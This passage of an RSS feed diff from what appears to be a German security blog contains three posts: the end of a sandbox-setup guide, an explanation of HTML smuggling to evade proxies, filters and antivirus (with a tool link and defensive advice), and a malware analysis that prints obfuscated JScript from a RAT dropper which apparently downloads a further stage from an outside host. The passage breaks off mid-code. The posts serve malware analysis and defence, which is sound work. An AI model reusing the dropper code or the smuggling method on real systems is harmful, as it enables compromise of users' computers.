+mit seiner SOCKS-Proxy-Funktion.
+Dafür führt man die folgenden Befehle aus:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-sh&#34; data-lang=&#34;sh&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;curl -fsSL https://pkg.cloudflareclient.com/pubkey.gpg | sudo gpg --yes --dearmor --output /usr/share/keyrings/cloudflare-warp-archive-keyring.gpg
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;echo &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;deb [arch=amd64 signed-by=/usr/share/keyrings/cloudflare-warp-archive-keyring.gpg] https://pkg.cloudflareclient.com/ &lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;lsb_release -cs&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt; main&amp;#34;&lt;/span&gt; | sudo tee /etc/apt/sources.list.d/cloudflare-client.list
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;sudo apt-get update &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; sudo apt-get install cloudflare-warp
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;warp-cli register --accept-tos
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;warp-cli set-families-mode off
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;warp-cli set-mode proxy
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;warp-cli connect
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;warp-cli status
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ss -tulpn | grep warp &lt;span style=&#34;color:#75715e&#34;&gt;# Hier sollte hoffentlich 127.0.0.1:40000 stehen&lt;/span&gt;
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;hr&gt;
+&lt;p&gt;Links:
+&lt;a href=&#34;https://github.com/kevoreilly/CAPEv2&#34;&gt;https://github.com/kevoreilly/CAPEv2&lt;/a&gt; - Github-Seite von CAPEv2
+&lt;a href=&#34;https://capev2.readthedocs.io/en/latest/&#34;&gt;https://capev2.readthedocs.io/en/latest/#&lt;/a&gt; - CAPEv2 offizielle Dokumentation
+&lt;a href=&#34;https://capesandbox.com/&#34;&gt;https://capesandbox.com/&lt;/a&gt; - CAPEv2 öffentliche Demoinstanz&lt;/p&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>Umgehen von Content Filtering, Proxies und Antivirus mit HTML Dateien</title>
+      <link>https://www.jmbit.de/blog/2023-08-28-html-bypass-filters/</link>
+      <pubDate>Mon, 28 Aug 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.jmbit.de/blog/2023-08-28-html-bypass-filters/</guid>
+      <description>Einleitung Seit einigen Monaten arbeite ich hin und wieder an diesem Verfahren, das es einem ermöglicht, auch an ansonsten sehr robust konfigurierten Proxies vorbeizukommen, aber auch Endpoint-Basierte Schutzmechanismen zu umgehen, deren primäre verteidigung die Quelle eines Dateidownloads ist. Der grundsätzlich Ablauf des Verfahrens ist relativ einfach. Am besten lässt es sich an einem Beispiel verstehen:
+1. Stufe - Seltsame E-Mail Der Benutzer hat diese Mail bekommen: Die meisten Benutzer werden diesen Anhang vermutlich öffnen, da sie nichts verwerfliches daran sehen.</description>
+      <content>&lt;h2 id=&#34;einleitung&#34;&gt;Einleitung&lt;/h2&gt;
+&lt;p&gt;Seit einigen Monaten arbeite ich hin und wieder an diesem Verfahren, das es einem ermöglicht, auch an ansonsten
+sehr robust konfigurierten Proxies vorbeizukommen, aber auch Endpoint-Basierte Schutzmechanismen zu umgehen, deren
+primäre verteidigung die Quelle eines Dateidownloads ist. Der grundsätzlich Ablauf des Verfahrens ist relativ
+einfach. Am besten lässt es sich an einem Beispiel verstehen:&lt;/p&gt;
+&lt;h2 id=&#34;1-stufe---seltsame-e-mail&#34;&gt;1. Stufe - Seltsame E-Mail&lt;/h2&gt;
+&lt;p&gt;Der Benutzer hat diese Mail bekommen:
+&lt;img alt=&#34;E-Mail mit HTML anhang&#34; src=&#34;https://www.jmbit.de/img/blog/2023-08-28-email.png&#34;&gt;
+Die meisten Benutzer werden diesen Anhang vermutlich öffnen, da sie nichts verwerfliches daran sehen.&lt;/p&gt;
+&lt;h2 id=&#34;2stufe---download-der-datei-aus-dem-browser&#34;&gt;2.Stufe - Download der Datei aus dem Browser&lt;/h2&gt;
+&lt;p&gt;Das öffnen der Datei führt dann zu dieser Seite:
+&lt;img alt=&#34;&amp;ldquo;Secure File&amp;rdquo; Portal&#34; src=&#34;https://www.jmbit.de/img/blog/2023-08-28-securefileportal.png&#34;&gt;
+In diesem Beispiel ist die HTML-Seite bewusst sehr einfach gehalten und nicht obfuscated oder anderweitig
+modifiziert. Auf dieser Seite könnten ggf. auch Instruktionen zum weiteren Verfahren sein.&lt;/p&gt;
+&lt;h2 id=&#34;3a-stufe---entblocken&#34;&gt;3.a Stufe - Entblocken&lt;/h2&gt;
+&lt;p&gt;Wenn das Attachment auf einem Windows-Computer geöffnet wurde und ein Microsoft Office-Dokument ist, muss - je nach
+Zonen-Einstellungen - die Datei &amp;ldquo;Entblockt&amp;rdquo; werden. Dies kann allerdings dann mit einem Mark-Of-The-Web-Bypass
+umgangen werden. Hierfür können die Dateien z.B. in einem Archiv oder Filesystem-Container untergebracht werden,
+der kein NTFS beherrscht (etwa ISO 9660), oder über einen weniger offensichtlichen Loader geöffnet werden.
+Unter Linux/UNIX-Systemen muss hier in der Regel das Execute-Bit auf der Datei gesetzt werden, sofern die Datei
+ausführbar sein soll.&lt;/p&gt;
+&lt;h2 id=&#34;3b---dateien-sind-lokal-auf-dem-computer&#34;&gt;3.b - Dateien sind lokal auf dem Computer&lt;/h2&gt;
+&lt;p&gt;Bei Dateitypen, die keiner so starken Absicherung unterliegen, oder bei Systemen, die dieses Prinzip der Absicherung
+nicht nutzen, steht die Datei im vollen Umfang zur Verfügung. Wird der Benutzer jetzt dazu angeleitet, die Warnung
+gegen das Ausführen von aus dem Internet heruntergeladenen Dateien zu ignorieren (oder diese wird umgangen), kann
+Schadcode ausgeführt werden. Da die Datei auf dem Rechner selbst generiert wird und nicht aus dem Internet kommt,
+greifen auch viele Antivirus/EDR-Tools nicht unbedingt ein.&lt;/p&gt;
+&lt;h2 id=&#34;4-stufe---exploitation&#34;&gt;4. Stufe - Exploitation&lt;/h2&gt;
+&lt;p&gt;Nachdem die Malware an den Netzwerk - und manchen Endpoint - angekommen ist und optimalerweise vom Anwender
+ausgeführt wurde, kann der Computer übernommen werden und sich weiter im Netzwerk verbreitet werden.&lt;/p&gt;
+&lt;h2 id=&#34;wie-funktioniert-es&#34;&gt;Wie funktioniert es?&lt;/h2&gt;
+&lt;p&gt;Web- und Emailfilter (Proxy, Gateway, File inspection etc.) führen in der Regel keine dynamische Analyse von Dateien
+(e-Mail-Anhängen, heruntergeladene Dateien o.ä.) durch. Daher ist es möglich, Dateien in einem eigentlich harmlosen
+und auch oft verwendeten Dateiformat (z.B. HTML) an diesen Sicherheitsmaßnahmen vorbeizuschleusen.
+Beispieldateien finden sich &lt;a href=&#34;https://cloud.jmbit.de/s/AJ6wW32dc5qfGd6&#34;&gt;Hier&lt;/a&gt;, das Projekt zur Erstellung von solchen
+Dateien findet sich &lt;a href=&#34;https://codeberg.org/jmbit/trojantool&#34;&gt;Hier&lt;/a&gt;&lt;/p&gt;
+&lt;h2 id=&#34;was-kann-man-dagegen-tun&#34;&gt;Was kann man dagegen tun?&lt;/h2&gt;
+&lt;p&gt;Das wichtigste Mittel gegen solche Angriffe ist, sich weniger auf statische Attribute zu verlassen, sondern mehr auf
+Verhalten. Es gibt Verhaltensmuster, die im Alltag extrem selten auftreten, aber in fast jedem Angriff in
+irgendeiner Form auftauchen. Das klassische Beispiel ist das Command &lt;code&gt;whoami&lt;/code&gt; unter UNIX. ein alltäglicher Benutzer
+hat sehr selten Bedarf daran, anzuzeigen, welcher User er gerade ist. normalerweise steht dieser als teil des Prompt
+in der Konsole, oder ist anderweitig indiziert (z.B. $/# als teil des Prompt etc).&lt;/p&gt;
+&lt;hr&gt;
+&lt;h2 id=&#34;weitere-informationen&#34;&gt;Weitere Informationen&lt;/h2&gt;
+&lt;p&gt;Kurz nachdem ich diesen Blogpost veröffentlicht habe, wurde von DFIR ein Report über dieses Verfahren &amp;ldquo;in der freien
+Wildbahn&amp;rdquo; gepostet: &lt;a href=&#34;https://thedfirreport.com/2023/08/28/html-smuggling-leads-to-domain-wide-ransomware/&#34;&gt;HTML Smuggling Leads to Domain Wide
+Ransomware&lt;/a&gt;&lt;/p&gt;
+&lt;p&gt;MITRE-Seite zu diesem Verfahren:  &lt;a href=&#34;https://attack.mitre.org/techniques/T1027/006/&#34;&gt;HTML Smuggling&lt;/a&gt;&lt;/p&gt;
+&lt;!-- raw HTML omitted --&gt;
+</content>
+    </item>
+    
+    <item>
+      <title>JScript delivered RAT</title>
+      <link>https://www.jmbit.de/blog/2023-04-28-jsrat/</link>
+      <pubDate>Fri, 28 Apr 2023 00:00:00 +0000</pubDate>
+      
+      <guid>https://www.jmbit.de/blog/2023-04-28-jsrat/</guid>
+      <description>DISCLAIMER Das Herunterladen und ausführen von Malware, auch zum Zwecke der Analyse, ist gefährlich. Ich übernehme keinerlei Haftung für etwaige Schäden bei Nachahmung!
+UPDATE Neuere Varianten dieser Malware verteilen nicht direkt die jscript-Datei, sondern eine HTML-Datei, die im Javascript erst eine Zip mit dieser JScript-Datei baut! Einführung In diesem Blogeintrag möchte ich einen kleinen Einblick in die Analyse bzw. das reverse-eingineering von Malware geben. Hier anhand einer Beispielmalware, die über Mehrere Stufen letztendlich &amp;ldquo;NetSupport Manager&amp;rdquo; als Remote Access Tool (RAT) installiert.</description>
+      <content>&lt;h1 id=&#34;disclaimer&#34;&gt;&lt;em&gt;DISCLAIMER&lt;/em&gt;&lt;/h1&gt;
+&lt;p&gt;&lt;strong&gt;Das Herunterladen und ausführen von Malware, auch zum Zwecke der Analyse, ist gefährlich. Ich übernehme
+keinerlei Haftung für etwaige Schäden bei Nachahmung!&lt;/strong&gt;&lt;/p&gt;
+&lt;table&gt;
+&lt;thead&gt;
+&lt;tr&gt;
+&lt;th&gt;UPDATE&lt;/th&gt;
+&lt;/tr&gt;
+&lt;/thead&gt;
+&lt;tbody&gt;
+&lt;tr&gt;
+&lt;td&gt;Neuere Varianten dieser Malware verteilen nicht direkt die jscript-Datei, sondern eine HTML-Datei, die im Javascript erst eine Zip mit dieser JScript-Datei baut!&lt;/td&gt;
+&lt;/tr&gt;
+&lt;/tbody&gt;
+&lt;/table&gt;
+&lt;h2 id=&#34;einführung&#34;&gt;Einführung&lt;/h2&gt;
+&lt;p&gt;In diesem Blogeintrag möchte ich einen kleinen Einblick in die Analyse bzw. das reverse-eingineering von Malware geben.
+Hier anhand einer Beispielmalware, die über Mehrere Stufen letztendlich &amp;ldquo;NetSupport Manager&amp;rdquo; als Remote Access Tool
+(RAT) installiert.&lt;/p&gt;
+&lt;p&gt;Auf den ersten Blick scheint die Datei vergleichsweise harmlos, insbesondere wenn man z.B. in Windows nicht aktiviert
+hat, dass der Dateiname vollständig (inkl. Endung) angezeigt wird.
+&lt;img alt=&#34;Screenshot der Dateivorschau&#34; src=&#34;https://www.jmbit.de/img/blog/Screenshot_from_2023-04_28-08-50-24.png&#34;&gt;&lt;/p&gt;
+&lt;p&gt;Sollte ein Windows-User die Datei zum öffnen Doppelklicken, wird sie, statt wie zu erwarten im konfigurierten PDF-Viewer
+angezeigt zu werden, vom &lt;a href=&#34;https://de.wikipedia.org/wiki/Windows_Script_Host&#34;&gt;Windows Script Host&lt;/a&gt; mithilfe dessen
+JScript-Engine ausgeführt.&lt;/p&gt;
+&lt;h2 id=&#34;stage-1&#34;&gt;Stage 1&lt;/h2&gt;
+&lt;p&gt;Die initial heruntergeladene Datei ist sehr stark &lt;a href=&#34;https://de.wikipedia.org/wiki/Obfuskation&#34;&gt;Obfuscated&lt;/a&gt;, was das
+Reverse engineering deutlich erschwert. Ein relativ einfacher Trick ist hier jedoch, die eigentlichen Aufrufe, die die
+nächste Stage herunterladen wollen, so umzubauen, dass sie statt dem eigentlichen Aufruf jediglich den entsprechenden
+Code ausgeben:&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;LRVydqTXzFWJIfh&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;psLt&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;PoHdrRpqKNwXVGyEDMO&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V0&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;J7Hu&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;CkMPuJXlbEaniIF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ActiveXObject&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;LRVydqTXzFWJIfh&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.APPlIcatioN&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;FNwMBmgDjPdaInUxO&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ActiveXObject&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;V1&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3a&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3NAk&amp;#39;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;FNwMBmgDjPdaInUxO&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;V1&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bmzj&amp;#39;&lt;/span&gt;)](&lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x85&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;KWPY&amp;#39;&lt;/span&gt;)) &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;!&lt;/span&gt;[] &lt;span style=&#34;color:#f92672&#34;&gt;&amp;amp;&amp;amp;&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;CkMPuJXlbEaniIF&lt;/span&gt;[&lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xac&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ClZu&amp;#39;&lt;/span&gt;)](&lt;span style=&#34;color:#a6e22e&#34;&gt;PoHdrRpqKNwXVGyEDMO&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;V5&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xbb&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;^B7D&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LRVydqTXzFWJIfh&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V0&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;O7y)&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8f&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;EFHx&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V5&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x87&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xnQ2&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;kAG8AdwBuAGwAb&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V0&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4b&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$gV2&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9d&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;t[sl&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0AH&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V1&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;T1lY&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;dAB0AHAAcw&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V1&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x27&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;K!KR&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x22&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;0N#q&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V4&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x9e&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3ZuB&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;AGgAcwB1AHAAcABsAHkAdQBzAC4AYwBvAG0&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x48&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;s#8T&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;BsAG8AYwBhAGwAc&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V5&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x2c&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;YL@E&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&amp;#39;&lt;/span&gt;, &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x71&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;l!tn&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#ae81ff&#34;&gt;0x0&lt;/span&gt;);
+&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;&lt;em&gt;Hier erstellt die Malware ein ActiveXObjekt mit der nächsten Stufe und führt diese aus.&lt;/em&gt;&lt;/p&gt;
+&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-js&#34; data-lang=&#34;js&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;LRVydqTXzFWJIfh&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x46&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;psLt&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;PoHdrRpqKNwXVGyEDMO&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V0&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x12&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;J7Hu&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;CkMPuJXlbEaniIF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ActiveXObject&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;LRVydqTXzFWJIfh&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.APPlIcatioN&amp;#39;&lt;/span&gt;), &lt;span style=&#34;color:#a6e22e&#34;&gt;FNwMBmgDjPdaInUxO&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; &lt;span style=&#34;color:#66d9ef&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;ActiveXObject&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;V1&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x3a&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;3NAk&amp;#39;&lt;/span&gt;));
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;FNwMBmgDjPdaInUxO&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V1&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x39&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;bmzj&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x85&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;KWPY&amp;#39;&lt;/span&gt;)) ;
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;CkMPuJXlbEaniIF&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xac&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;ClZu&amp;#39;&lt;/span&gt;) )
+&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#a6e22e&#34;&gt;console&lt;/span&gt;.&lt;span style=&#34;color:#a6e22e&#34;&gt;log&lt;/span&gt;(&lt;span style=&#34;color:#a6e22e&#34;&gt;PoHdrRpqKNwXVGyEDMO&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V5&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0xbb&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;^B7D&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;LRVydqTXzFWJIfh&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V0&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x14&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;O7y)&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V3&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x8f&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;EFHx&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V5&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x87&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;xnQ2&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;kAG8AdwBuAGwAb&amp;#39;&lt;/span&gt; &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;V0&lt;/span&gt;(&lt;span style=&#34;color:#ae81ff&#34;&gt;0x4b&lt;/span&gt;, &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;$gV2&amp;#39;&lt;/span&gt;) &lt;span style=&#34;color:#f92672&#34;&gt;+&lt;/span&gt; &lt;span style=&#34;color:#a6e22e&#34;&gt;l&lt;/span&gt;(&lt;span 